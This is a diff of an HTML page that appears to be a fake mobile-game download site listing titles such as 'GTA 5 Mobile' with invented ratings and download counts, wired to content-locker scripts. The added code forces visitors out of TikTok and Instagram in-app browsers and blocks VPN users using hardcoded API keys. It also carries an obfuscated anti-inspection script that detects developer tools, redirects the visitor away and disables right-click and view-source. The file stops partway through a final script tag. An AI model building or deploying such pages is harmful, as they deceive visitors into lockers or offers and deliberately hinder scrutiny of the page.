@@ -1,205 +1,1087 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mobile Games</title>
-  <script type="text/javascript">
-    var tLmWt_tjd_UkMWrc={"it":4489096,"key":"b5a99"};
-</script>
-<script src="https://d2yc6hxtq0phup.cloudfront.net/436d627.js"></script>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #0f172a, #1e293b);
-      color: #ffffff;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Game</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #f0f8ff;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #007BFF;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 32px;
+            letter-spacing: 1px;
+        }
+
+        .game-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px;
+            padding-bottom: 100px;
+        }
+
+        .game-item {
+            background-color: white;
+            width: 90%;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 2px solid #007BFF;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            transform: translateY(0);
+        }
+
+        .game-item:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,123,255,0.15);
+        }
+
+        .game-item img {
+            width: 80px;
+            height: 80px;
+            border-radius: 10px;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+
+        .game-item:hover img {
+            transform: scale(1.05);
+        }
+
+        .game-details {
+            flex: 1;
+            padding-left: 15px;
+        }
+
+        .game-name {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .game-rating {
+            font-size: 16px;
+            color: #ffa500;
+            margin: 5px 0;
+        }
+
+        .game-desc {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .download-info {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            margin-left: 15px;
+        }
+
+        .download-button {
+            background-color: #007BFF;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            box-shadow: 0 3px 10px rgba(0,123,255,0.2);
+        }
+
+        .download-button:hover {
+            background-color: #0056b3;
+            transform: translateY(-1px);
+        }
+
+        .download-count {
+            color: #666;
+            font-size: 12px;
+            margin-top: 5px;
+            white-space: nowrap;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #007BFF;
+            color: white;
+            font-size: 14px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+        }
+
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            z-index: 1000;
+        }
+
+        .popup.active {
+            display: flex;
+            opacity: 1;
+        }
+
+        .popup-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+            transform: scale(0.9);
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            opacity: 0;
+        }
+
+        .popup.active .popup-content {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .popup-game-title {
+            background: linear-gradient(90deg,
+                rgb(255, 0, 0) 0%,         /* أحمر نيون */
+                rgb(0, 255, 0) 25%,        /* أخضر نيون */
+                rgb(0, 0, 255) 50%,        /* أزرق نيون */
+                rgb(255, 255, 0) 75%,      /* أصفر نيون */
+                rgb(255, 0, 255) 100%      /* أرجواني نيون */
+            );
+            background-size: 200% auto;
+            color: transparent;
+            -webkit-background-clip: text;
+            background-clip: text;
+            animation: gradientFlow 3s linear infinite;
+            font-size: 24px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
+
+        @keyframes gradientFlow {
+            0% { background-position: 0% center; }
+            100% { background-position: 200% center; }
+        }
+
+        .verify-button {
+            margin: 25px auto 0;
+            padding: 12px 30px;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 25px;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            transform: translateY(20px);
+            opacity: 0;
+        }
+
+        .verify-button.visible {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .verify-button:hover {
+            background-color: #0056b3;
+            box-shadow: 0 5px 15px rgba(0,123,255,0.3);
+        }
+
+        /* Circle Progress Styles */
+        .circle-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 20px auto;
+        }
+
+        .circle-progress {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .circle-progress circle {
+            fill: none;
+            stroke-width: 4;
+            stroke-linecap: round;
+        }
+
+        .circle-progress-background {
+            stroke: #e6e6e6;
+        }
+
+        .circle-progress-bar {
+            stroke: #ffa500; /* لون برتقالي مبدئي */
+            transition: stroke-dashoffset 0.3s ease-out;
+        }
+
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 20px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        
+         .featured-games {
+        display: flex;
+        justify-content: center;
+        gap: 15px;
+        margin-bottom: 20px;
     }
 
-    h1 {
-      text-align: center;
-      padding: 20px;
-      font-size: 28px;
-      background: #1a336e;
-      margin: 0;
-      color: #0dff19;
-      text-shadow: 2px 2px 8px #070707;
-      
+    .featured-games .game-item {
+        width: 45%;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
     }
 
-    .container {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
-      gap: 20px;
-      padding: 20px;
-      max-width: 1200px;
-      margin: auto;
+    .all-games .game-item {
+        width: 95%;
+    }
+        
+        .featured-games .game-item img {
+        width: 120px; /* عرض الصورة */
+        height: 120px; /* ارتفاع الصورة */
+        border-radius: 15px; /* تعديل الزوايا */
+        object-fit: cover; /* لجعل الصورة تظهر بشكل متناسق */
+    }
+   
+   #darkModeToggle {
+    position: absolute;
+    top: 20px;
+    right: 15px;
+    background: #fff;
+    border: none;
+    padding: 8px 12px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 18px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    transition: background 0.3s ease, transform 0.2s ease;
+}
+
+#darkModeToggle:hover {
+    background: #ddd;
+    transform: scale(1.1);
+}
+
+.dark-mode {
+    background-color: #121212;
+    color: #ffffff;
+}
+
+.dark-mode header {
+    background-color: #1e1e1e;
+}
+
+.dark-mode .game-item {
+    background-color: #222;
+    border-color: #555;
+}
+
+.dark-mode .game-name,
+.dark-mode .game-rating,
+.dark-mode .game-desc,
+.dark-mode .download-count {
+    color: #fff;
+}
+
+.dark-mode .download-button {
+    background-color: #444;
+}
+
+.dark-mode .download-button:hover {
+    background-color: #666;
+}
+   
+        .search-container {
+    position: absolute;
+    top: 25px;
+    left: 10px;
+    display: flex;
+    align-items: center;
+}
+
+#searchInput {
+    width: 100px; /* تقليل العرض */
+    padding: 5px 8px;
+    font-size: 12px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    outline: none;
+    transition: width 0.3s ease, background 0.3s ease;
+}
+
+#searchInput:focus {
+    width: 140px; /* يتوسع قليلاً عند التركيز */
+    background: #f8f8f8;
+}
+
+/* أنماط التدرج اللوني */
+.gradient-title {
+    background: linear-gradient(90deg,
+        #ff0000 0%,
+        #00ff00 25%,
+        #0000ff 50%,
+        #ffff00 75%,
+        #ff00ff 100%
+    );
+    background-size: 200% auto;
+    color: transparent;
+    -webkit-background-clip: text;
+    background-clip: text;
+    animation: gradientFlow 3s linear infinite;
+    font-size: 24px;
+    margin: 15px 0;
+    display: block;
+    width: 100%;
+    text-align: center;
+}
+
+.gradient-line {
+    width: 200px;
+    height: 3px;
+    margin: -5px auto 20px;
+    background: linear-gradient(90deg,
+        #ff0000 0%,
+        #00ff00 25%,
+        #0000ff 50%,
+        #ffff00 75%,
+        #ff00ff 100%
+    );
+    background-size: 200% auto;
+    animation: gradientFlow 3s linear infinite;
+    border-radius: 2px;
+}
+
+@keyframes gradientFlow {
+    0% { background-position: 0% center; }
+    100% { background-position: 200% center; }
+}
+
+/* أضف هذه الأنماط إلى قسم الـ CSS */
+.dark-mode .popup-content {
+    background-color: #2d2d2d !important;
+    box-shadow: 0 0 15px rgba(255,255,255,0.1);
+}
+
+.dark-mode .popup-game-title {
+    text-shadow: 0 0 10px rgba(0,0,0,0.7);
+}
+
+.dark-mode .progress-text {
+    color: #fff !important;
+}
+
+.dark-mode .verify-button {
+    background-color: #444 !important;
+    color: #fff !important;
+}
+
+.dark-mode .verify-button:hover {
+    background-color: #666 !important;
+}
+
+.dark-mode .circle-progress-background {
+    stroke: #444 !important;
+}
+
+/* تغيير حجم النصوص والصور في الشاشات الصغيرة */
+@media (max-width: 480px) {
+    .game-item {
+        padding: 12px !important;
+        margin: 6px 0 !important;
     }
 
-    .game-box {
-      background: #1e293b;
-      border-radius: 16px;
-      overflow: hidden;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.25);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      text-align: center;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    .game-item img {
+        width: 60px !important;
+        height: 60px !important;
     }
 
-    .game-box:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 15px 30px rgba(0,0,0,0.4);
+    .game-name {
+        font-size: 14px !important;
     }
 
-    .game-img {
-      width: 100%;
-      height: 150px;
-      object-fit: cover;
+    .game-desc {
+        font-size: 11px !important;
     }
 
-    .game-content {
-      padding: 15px;
-      flex: 1;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
+    .download-button {
+        padding: 6px 15px !important;
+        font-size: 12px !important;
     }
+}
 
-    .game-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #3cff0b;
-      margin-bottom: 8px;
-      text-shadow: 2px 2px 8px #000000;
-
+/* الشاشات المتوسطة */
+@media (max-width: 768px) {
+    .game-item {
+        width: 100%;
     }
-
-    .downloads {
-      font-size: 14px;
-      color: #c1c8d3;
-      margin-bottom: 15px;
+    
+    .featured-games .game-item {
+        width: 48%;
     }
+}
 
-    .download-btn {
-      background: linear-gradient(135deg, #3b82f6, #06b6d4);
-      color: #fff;
-      border: none;
-      padding: 10px 18px;
-      font-size: 14px;
-      border-radius: 30px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-      text-decoration: none;
+/* الشاشات الكبيرة */
+@media (min-width: 1024px) {
+    .game-item {
+        width: 30%;
     }
+}
 
-    .download-btn:hover {
-      background: linear-gradient(135deg, #2563eb, #0891b2);
-    }
+/* تحسينات خاصة للوضع الداكن */
+.dark-mode .game-item {
+    background-color: #333 !important;
+}
 
-    @media (max-width: 768px) {
-      .game-title {
-        font-size: 16px;
-      }
 
-      .downloads {
-        font-size: 13px;
-      }
+.featured-games .game-item img {
+    width: 90px !important;
+    height: 90px !important;
+    border-radius: 15px !important;
+    object-fit: cover !important;
+}
 
-      .download-btn {
-        font-size: 13px;
-        padding: 8px 16px;
-      }
-    }
-  </style>
+
+/* تنسيق الأيقونة وحقل البحث */
+.search-container {
+    position: absolute;
+    top: 25px;
+    left: 10px;
+    display: flex;
+    align-items: center;
+}
+
+#searchIcon {
+    font-size: 20px;
+    background-color: transparent;
+    border: none;
+    cursor: pointer;
+    padding: 8px;
+    border-radius: 50%; /* شكل دائري */
+    transition: all 0.3s ease; /* تأثير التحول */
+}
+
+#searchInput {
+    display: none; /* إخفاء حقل البحث في البداية */
+    width: 100px;
+    padding: 5px 8px;
+    font-size: 12px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    outline: none;
+    transition: width 0.3s ease, background 0.3s ease;
+}
+
+#searchInput.show {
+    display: inline-block; /* إظهار حقل البحث عند الضغط */
+    width: 140px;
+}
+
+#searchInput:focus {
+    background: #f8f8f8;
+    width: 180px; /* توسيع حقل البحث عند التركيز */
+}
+
+/* تأثير عند الضغط على الأيقونة */
+#searchIcon.active {
+    border-radius: 5px; /* تحول الأيقونة إلى مستطيل */
+    padding-left: 10px; /* مساحة إضافية في الحافة */
+}
+
+
+.all-games .game-item img {
+    width: 70px !important; /* عرض الصورة */
+    height: 70px !important; /* ارتفاع الصورة */
+    border-radius: 12px !important; /* تعديل زوايا الصورة */
+    object-fit: cover !important; /* لضبط حجم الصورة داخل الإطار */
+}
+
+.popup-content {
+    width: 80% !important; /* تقليص العرض */
+    max-width: 350px !important; /* تقليص العرض الأقصى */
+    height: auto !important; /* اضبط الارتفاع حسب المحتوى */
+    padding: 20px !important; /* تقليص المسافة الداخلية */
+    border-radius: 12px !important; /* تعديل الزوايا */
+}
+
+
+
+    </style>
+
+ 
+  
+<!-- <link rel="me" href="https://www.blogger.com/profile/01346904356366767412" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/> -->
 </head>
+  
+  
+  
+  
+  <script>
+  function detectAndRedirect() {
+    // Detect if the user is inside TikTok or Instagram in-app browser
+    const isInAppBrowser = /musical_ly|tiktok|instagram/i.test(navigator.userAgent);
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+
+    if (isInAppBrowser && isMobile) {
+      const currentURL = window.location.href;
+
+      // Redirect on iOS devices
+      if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        const browserSchemes = [
+          'googlechrome://',
+          'firefox://',
+          'opera://',
+          'brave://',
+          'edge://'
+        ];
+
+        let currentIndex = 0;
+
+        function tryNextBrowser() {
+          if (currentIndex < browserSchemes.length) {
+            window.location.href = browserSchemes[currentIndex] + currentURL;
+            currentIndex++;
+            setTimeout(tryNextBrowser, 300);
+          } else {
+            alert("We couldn't open the link automatically. Please copy and paste the link into an external browser.");
+          }
+        }
+
+        tryNextBrowser();
+      }
+      // Redirect on Android devices
+      else if (/Android/i.test(navigator.userAgent)) {
+        window.location.href = `intent://${window.location.host}${window.location.pathname}${window.location.search}#Intent;scheme=https;package=com.android.chrome;end;`;
+      }
+    }
+  }
+
+  window.addEventListener('load', detectAndRedirect);
+</script>
+  
+ <script>
+(function(){
+    var _0x1a2b=["\x6F\x75\x74\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x6F\x75\x74\x65\x72\x48\x65\x69\x67\x68\x74","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D","\x61\x6C\x65\x72\x74","\xD8\xA7\xD9\x84\xD8\xA5\xD8\xAC\xD8\xB1\xD8\xA7\xD8\xA1\x20\xD8\xBA\xD9\x8A\xD8\xB1\x20\xD9\x85\xD8\xB3\xD9\x85\xD9\x88\xD8\xAD\x2E","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x63\x6F\x6E\x74\x65\x78\x74\x6D\x65\x6E\x75","\xD8\xA7\xD9\x84\xD9\x83\xD9\x84\xD9\x8A\xD9\x83\x20\xD8\xA7\xD9\x84\xD9\x8A\xD9\x85\xD9\x8A\xD9\x86\x20\xD9\x85\xD8\xB9\xD8\xB7\xD9\x84\x2E","\x64\x72\x61\x67\x73\x74\x61\x72\x74","\x73\x65\x6C\x65\x63\x74\x73\x74\x61\x72\x74","\x46\x31\x32","\x63\x74\x72\x6C\x4B\x65\x79","\x73\x68\x69\x66\x74\x4B\x65\x79","\x49","\x69","\x75","\x55","\x63","\x43","\x73","\x53"];
+    var detected=false;
+    function detectDevTools(){
+        if(window[_0x1a2b[0]]-window[_0x1a2b[1]]>160||window[_0x1a2b[2]]-window[_0x1a2b[3]]>160){
+            if(!detected){
+                detected=true;
+                alert('تم كشف محاولة فحص الكود! سيتم إغلاق الصفحة.');
+                window[_0x1a2b[4]][_0x1a2b[5]]=_0x1a2b[6];
+            }
+        }else{
+            detected=false;
+        }
+    }
+    setInterval(detectDevTools,500);
+
+    document.addEventListener('keydown',function(e){
+        if(e.key===_0x1a2b[14]||(e[_0x1a2b[15]]&&e[_0x1a2b[16]]&&(e.key===_0x1a2b[17]||e.key===_0x1a2b[18]))||(e[_0x1a2b[15]]&&(e.key===_0x1a2b[19]||e.key===_0x1a2b[20]))||(e[_0x1a2b[15]]&&(e.key===_0x1a2b[21]||e.key===_0x1a2b[22]))||(e[_0x1a2b[15]]&&(e.key===_0x1a2b[23]||e.key===_0x1a2b[24]))){
+            e[_0x1a2b[9]]();
+            alert(_0x1a2b[8]);
+        }
+    });
+
+    document.addEventListener(_0x1a2b[10],function(e){
+        e[_0x1a2b[9]]();
+        alert(_0x1a2b[11]);
+    });
+
+    document.addEventListener(_0x1a2b[12],function(e){
+        e[_0x1a2b[9]]();
+    });
+
+    document.addEventListener(_0x1a2b[13],function(e){
+        e[_0x1a2b[9]]();
+    });
+})();
+</script>
+  
+    
+ 
+  <script>
+  const apiKeys = [
+    "d961d3d33de544f092c8027e31fab705", // استبدل بهذه المفاتيح الحقيقية
+    "fdb4d5b1a920485e849cc03da0f49c8e",
+    "API_KEY_3"
+  ];
+
+  let currentKeyIndex = 0;
+
+  async function checkVPN() {
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+
+    let checked = false;
+
+    while (currentKeyIndex < apiKeys.length && !checked) {
+      const apiKey = apiKeys[currentKeyIndex];
+
+      try {
+        const response = await fetch(`https://vpnapi.io/api/${ip}?key=${apiKey}`);
+        if (!response.ok) {
+          throw new Error("المفتاح غير صالح أو انتهى الحد.");
+        }
+
+        const data = await response.json();
+
+        if (data.security && (data.security.vpn || data.security.proxy || data.security.tor)) {
+          document.body.innerHTML = "<h2>Please turn off VPN or proxy, to use this site</h2>";
+        }
+
+        checked = true; // تم الفحص بنجاح
+      } catch (err) {
+        console.warn(`المفتاح ${currentKeyIndex + 1} فشل. الانتقال للمفتاح التالي...`);
+        currentKeyIndex++;
+      }
+    }
+
+    // إذا فشلت كل المفاتيح، يتم السماح بالدخول تلقائيًا
+    if (!checked) {
+      console.warn("فشلت جميع المفاتيح، السماح بالدخول مؤقتاً.");
+      // لا شيء يحدث، الزائر يدخل بشكل طبيعي
+    }
+  }
+
+  checkVPN();
+</script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
 <body>
 
-  <h1>Mobile Games</h1>
+<header>
+    <div class="header-controls">
+        
+        <h1>Mobile Game</h1>
+        <button id="darkModeToggle">🌙</button>
+    </div>
+</header>
 
-  <div class="container">
+<div class="game-container">
 
-    <!-- Game 1 -->
-    <div class="game-box">
-      <img src="https://media-hosting.imagekit.io/d62b6d7417094cd1/images.jpg?Expires=1841624401&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=Vzh1TtUzZjsZBOKqRWF7aS42x3s5od6d9lnUm3ZnWVmQfOENUYtRhKyGCBWcvEXI1-g27UUmxoxVp2XDZq~GYaQ~zUTWjgpsB1gblfoRafYbLtBee6chrmfz7pUt34YpqacHnEIuY8t3TiDuxL4S7xkO1ElrqMajlpXP3G8h6xUMQms9KFGfWZ1G7dPahcss3zRCyUITj5AlhuiijzJxTTBZ0KP0V9PxE48bB9UbHwFbGwc4KSRJqlvaTAxHwyxCp~DxedJoQctidR2SaSYxG7UY2WxILJ19Npo-lxbJmlSiDFpUwqMdjWmDVAgfHdb2IDaK44RB5o7u9KcfAQTA-A__" class="game-img" alt="Fortnite Mobile">
-      <div class="game-content">
-        <div class="game-title">Fortnite Mobile</div>
-        <div class="downloads">📥 1,245,000 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
+   
+    <!-- قسم Featured Apps -->
+<h2 class="gradient-title" style="text-align: center;">Featured Games</h2>
+<div class="gradient-line"></div>
+<div class="featured-games">
+    <div class="game-item">
+        <img src="https://i.ibb.co/WqNRKGS/freepik-a-logo-with-gta-san-andreas-mod-graphics-set-again-14802.png" alt="Gta San Andreas Mod Graphics">
+        <div class="game-details">
+            <div class="game-name">Gta San Andreas Mod Graphics</div>
+            <div class="game-rating">★ 4.8</div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">519,663 Downloads</div>
+        </div>
     </div>
 
-    <!-- Game 2 -->
-    <div class="game-box">
-      <img src="https://media-hosting.imagekit.io/d16b8bb69b3c415e/670cd4e90a54e85645f4551c6dbed6ab.jpg?Expires=1841627256&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=LYBugmxL0tulx8VjoYrxE6nGwm77oEjYqdbOeQ3aLDQXqgaEKV8KhnxxvRgyWNOyhazxFAzT1jTE00jacwYOHdFrlsSXl11bv2H3w0-AH1OKfRpAILt8kdSVWjfIocSgyRTytOHI1FshKXelk8uMl-SYQFeLjvjJPLzxfV4cE1b-tNEKP-6W~F4O4E~M-XcxEZTQaUToS526pzZkbE325XciTMcJCtpnsdg4dx80Lv3KfW73y7rNqBaQVpshTuZHSFnJ~wD9wM~1-Rb1CzbMrgBX~VOG2ZM9P-tBcci45BbY6dhxS11wtQ7o1cG5WZ~QQFVNuhh1-ATwtX9lHvxrgQ__" class="game-img" alt="GTA 5">
-      <div class="game-content">
-        <div class="game-title">GTA 5</div>
-        <div class="downloads">📥 980,340 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
+    <div class="game-item">
+        <img src="https://i.ibb.co/6RKhG87c/images-1.jpg" alt="Schoolboy runaway mod menu">
+        <div class="game-details">
+            <div class="game-name">SPIDER MAN 2 MOBILE</div>
+            <div class="game-rating">★ 4.7</div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">319,441 Downloads</div>
+        </div>
+    </div>
+</div>
+    <!-- قسم All Apps -->
+    <h2 class="gradient-title" style="text-align: center;">All Games</h2>
+<div class="gradient-line"></div>
+<div class="all-games">
+    
+    <!-- لعبة 1 -->
+    <div class="game-item">
+        <img src="https://i.ibb.co/Q3R3H0jz/gta-gta-v-gta-5-rockstar-game-5652.jpg" alt="GTA 5 Mobile">
+        <div class="game-details">
+            <div class="game-name">GTA 5 Mobile</div>
+            <div class="game-rating">★ 4.9</div>
+            <div class="game-desc"></div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">1,234,567 Downloads</div>
+        </div>
+    </div>
+  
+  <!-- لعبة 2 -->
+    <div class="game-item">
+        <img src="https://i.ibb.co/XZdGJbkp/capsule-616x353.jpg" alt="Snake Gold">
+        <div class="game-details">
+            <div class="game-name">Bus Simulator Ultimate</div>
+            <div class="game-rating">★ 4.8</div>
+            <div class="game-desc"></div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">412,345 Downloads</div>
+        </div>
     </div>
 
-    <!-- Game 3 -->
-    <div class="game-box">
-      <img src="https://j.top4top.io/p_3415day351.jpg" class="game-img" alt="Gta San Andreas mobile">
-      <div class="game-content">
-        <div class="game-title">Gta San Andreas mobile</div>
-        <div class="downloads">📥 765,450 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
+
+    <!-- لعبة 3 -->
+    <div class="game-item">
+        <img src="https://i.ibb.co/5hXZhyNr/1742387209-poppy-playtime-chapter-4.png" alt="Minecraft">
+        <div class="game-details">
+            <div class="game-name">Poppy Playtime Chapter 4</div>
+            <div class="game-rating">★ 4.9</div>
+            <div class="game-desc"></div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">3,456,789 Downloads</div>
+        </div>
     </div>
 
-    <!-- Game 4 -->
-    <div class="game-box">
-      <img src="https://media-hosting.imagekit.io/d3ac942ea90e47c7/images%20(1).jpg?Expires=1841627771&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=uC7dtj~dlP9W5FndZuYetu-xKaoDtIYLF1HlL-eBAgFI-Jui2MJ1uYxunkyRNQbmp8FDMO7cVu0o3toEH9yKolT2CMbrcQUqCkOi4l0d0qr3nU4FQfzPfWo9fu7Aix8nrA5GCFJlqw6R-9AWJp2CunlCEVno2HiwD4Q6RopOpeKVa5cheygK5XcwJ7WQ1M1P6XlsVpGluF-BuvNB3eMulvgaR5Zbk9-j7BLYdjVx3WzW6PGfxeiQxJJ2bK9CnKFG3ooMVFeewqBMJCz0czwzCjNnPp6BhAx2dbt0UkvnzRNdZuiox5FpYxj8TbCuVGHou8fmv8qeF4ZdUmDQjfvq6w__" class="game-img" alt="Forza Horizon 5">
-      <div class="game-content">
-        <div class="game-title">Forza Horizon 5</div>
-        <div class="downloads">📥 1,120,870 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
+    <!-- لعبة 4 (إضافة لعبة جديدة) -->
+    <div class="game-item">
+        <img src="https://i.ibb.co/TxwRqfj8/images.jpg" alt="NBA 2K 25">
+        <div class="game-details">
+            <div class="game-name">NBA 2K 25 MOD</div>
+            <div class="game-rating">★ 4.6</div>
+            <div class="game-desc"></div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">567,890 Downloads</div>
+        </div>
     </div>
 
-    <!-- Game 5 -->
-    <div class="game-box">
-      <img src="https://j.top4top.io/p_3415etvni1.jpg" class="game-img" alt="Spider Man Mobile">
-      <div class="game-content">
-        <div class="game-title">Spider Man Mobile</div>
-        <div class="downloads">📥 2,540,000 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
+
+<!-- لعبة 4 (إضافة لعبة جديدة) -->
+    <div class="game-item">
+        <img src="https://i.ibb.co/bMYw5Mdt/1719260830-car-parking-multiplayer-2-2.png" alt="Another Game">
+        <div class="game-details">
+            <div class="game-name">Car Parking Multiplayer 2</div>
+            <div class="game-rating">★ 4.6</div>
+            <div class="game-desc"></div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">567,890 Downloads</div>
+        </div>
     </div>
 
-    <!-- Game 6 -->
-    <div class="game-box">
-      <img src="https://media-hosting.imagekit.io/73e929444bea44d2/p_3415u45pv1.jpg?Expires=1841627578&Key-Pair-Id=K2ZIVPTIP2VGHC&Signature=lZVMeGetHcbLLobCuWNmM6CH-L7iK9ReFuytaCINQDDBJKAScGv4m7-UtsUFNT0QSr4QTrmjJBwze0TfOpE6QqwzsBJHKUbzAF-gtCdwLjUnFXuduqwcp~c8WzTqEebD97Oyi-WZ5Pu4A0mD5jbzK4cXfLWrxRV8smWJS4kjApUk8Ue6sQgyGKsc2O~GwPLJ5zsgV6Nb2WVs~bCQY65Ms~gAiDjBLBUJSjUzi-duj6EFGlMHmFfYjlbOyGV5i12YYUsGbV7nwXK9n3KZpY0ykdcJNAMpmNsjxP~k22X8Okp3QUppwvnYBLnY1xQSVBwArQGTFFJIQz-KIsNkYV7ABA__" class="game-img" alt="Euro Truck Simulator 2">
-      <div class="game-content">
-        <div class="game-title">Euro Truck Simulator 2</div>
-        <div class="downloads">📥 845,650 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
+<!-- لعبة 4 (إضافة لعبة جديدة) -->
+    <div class="game-item">
+        <img src="https://i.ibb.co/B2VfHVsp/hq720.jpg" alt="MOTO JP ">
+        <div class="game-details">
+            <div class="game-name">MOTO JP 25</div>
+            <div class="game-rating">★ 4.6</div>
+            <div class="game-desc"></div>
+        </div>
+        <div class="download-info">
+            <button class="download-button">Download</button>
+            <div class="download-count">567,890 Downloads</div>
+        </div>
     </div>
+                           
+               
+<!-- <script async="async" data-cfasync="false" src="//pl26593877.profitableratecpm.com/2e245f56931368076005c6115b7c17c2/invoke.js"></script>
+<div id="container-2e245f56931368076005c6115b7c17c2"></div>                                        -->
+                                       
+                                       
+                                       
 
-    <!-- Game 7 -->
-    <div class="game-box">
-      <img src="https://k.top4top.io/p_3415odeje1.jpg" class="game-img" alt="Bus Simulator Ultimate">
-      <div class="game-content">
-        <div class="game-title">Bus Simulator Ultimate</div>
-        <div class="downloads">📥 1,003,210 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
     </div>
+    <footer>
+        <p>© 2025 MobileGame. All rights reserved.</p>
+    </footer>
 
-    <!-- Game 8 -->
-    <div class="game-box">
-      <img src="https://j.top4top.io/p_34152isf61.jpg" class="game-img" alt="Game 8">
-      <div class="game-content">
-        <div class="game-title">Minecraft Mobile</div>
-        <div class="downloads">📥 678,000 Downloads</div>
-        <a href="#" class="download-btn" onclick="_Tt()">Download</a>
-      </div>
-    </div>
 
-  </div>
+
+<div id="adbluemedia-locker"></div>
+
+<script type="text/javascript">
